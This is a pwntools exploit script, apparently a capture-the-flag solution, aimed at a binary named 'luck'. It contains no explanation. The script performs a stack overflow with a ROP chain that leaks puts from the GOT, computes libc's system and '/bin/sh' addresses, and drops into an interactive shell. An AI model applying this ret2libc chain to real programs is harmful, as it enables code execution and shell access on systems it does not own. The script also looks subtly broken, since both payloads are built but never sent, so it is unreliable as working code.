from pwn import *

# p = remote('pwn.challenge.ctf.show', 28108)
while True:
    p = process('./pwn/luck')
    elf = ELF('./pwn/luck')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p.sendlineafter(b'Give me u lucky numbers?\n', b'\x00')
    a = p.recvline()
    log.info(a)
    if b'U are not the lucky man\n' in a:
        log.info(b'Good.')
        break
    else:
        p.close()
        continue

main_addr = elf.sym['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x0000000000400973
payload = b'a' * 0x38 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.recvuntil(b'This is the wrong password:')
puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\00'))
print('[+]\033[32m Wow! You got the puts address:\033[0m  \033[1;31m %s \033[0m' % hex(puts_addr))
p.sendlineafter(b'Give me u lucky numbers?\n', b'\x00')
base_addr = puts_addr - libc.symbols['puts']
system_addr = base_addr + libc.symbols['system']
binsh_addr = base_addr + next(libc.search(b'/bin/sh'))
payload = b'a' * 0x38 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
p.interactive()
